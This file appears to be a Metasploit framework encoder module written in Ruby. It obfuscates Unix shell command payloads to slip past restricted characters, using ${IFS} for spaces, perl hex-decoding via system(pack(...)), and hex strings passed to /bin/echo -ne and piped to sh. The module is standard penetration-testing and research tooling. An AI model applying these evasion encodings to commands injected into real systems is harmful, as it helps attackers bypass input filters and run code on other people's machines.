# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Encoder
  # Has some issues, but overall it's pretty good
  Rank = ManualRanking

  def initialize
    super(
      'Name'             => 'Generic Shell Variable Substitution Command Encoder',
      'Description'      => %q(
        This encoder uses standard Bourne shell variable substitution
      tricks to avoid commonly restricted characters.
      ),
      'Author'           => 'hdm',
      'Arch'             => ARCH_CMD,
      'Platform'         => 'unix')
  end

  #
  # Encodes the payload
  #
  def encode_block(state, buf)
    # Skip encoding for empty badchars
    return buf if state.badchars.empty?

    if state.badchars.include?("-")
      # Then neither of the others will work.  Get rid of spaces and hope
      # for the best.  This obviously won't work if the command already
      # has other badchars in it, in which case we're basically screwed.
      buf.gsub!(/\s/, '${IFS}') if state.badchars.include?(" ")
    else
      # Without an escape character we can't escape anything, so echo
      # won't work.  Try perl.
      buf = if state.badchars.include?("\\")
              encode_block_perl(state, buf)
            else
              encode_block_bash_echo(state, buf)
            end
    end

    buf
  end

  #
  # Uses the perl command to hex encode the command string
  #
  def encode_block_perl(state, buf)
    hex = buf.unpack("H*")
    cmd = 'perl -e '
    qot = ',-:.=+!@#$%^&'

    # Find a quoting character to use
    state.badchars.unpack('C*') { |c| qot.delete(c.chr) }

    # Throw an error if we ran out of quotes
    raise EncodingError if qot.empty?

    sep = qot[0].chr

    # Convert spaces to IFS...
    cmd.gsub!(/\s/, '${IFS}') if state.badchars.include?(" ")

    # Can we use single quotes to enclose the command string?
    if state.badchars.include?("'")

      if state.badchars =~ /\(|\)/

        # No paranthesis...
        raise EncodingError
      end

      cmd << "system\\(pack\\(qq#{sep}H\\*#{sep},qq#{sep}#{hex}#{sep}\\)\\)"

    else
      if state.badchars =~ /\(|\)/
        if state.badchars.include?(" ")
          # No spaces allowed, no paranthesis, give up...
          raise EncodingError
        end

        cmd << "'system pack qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}'"
      else
        cmd << "'system(pack(qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}))'"
      end
    end

    cmd
  end

  #
  # Uses bash's echo -ne command to hex encode the command string
  #
  def encode_block_bash_echo(state, buf)
    hex = ''

    # Can we use single quotes to enclose the echo arguments?
    hex = if state.badchars.include?("'")
            buf.unpack('C*').collect { |c| "\\\\\\x%.2x" % c }.join
          else
            "'" + buf.unpack('C*').collect { |c| "\\x%.2x" % c }.join + "'"
          end

    # Are pipe characters restricted?
    if state.badchars.include?("|")
      # How about backticks?
      if state.badchars.include?("`")
        # Last ditch effort, dollar paren
        if state.badchars.include?("$") || state.badchars.include?("(")
          raise EncodingError
        else
          buf = "$(/bin/echo -ne #{hex})"
        end
      else
        buf = "`/bin/echo -ne #{hex}`"
      end
    else
      buf = "/bin/echo -ne #{hex}|sh"
    end

    # Remove spaces from the command string
    buf.gsub!(/\s/, '${IFS}') if state.badchars.include?(" ")

    buf
  end
end
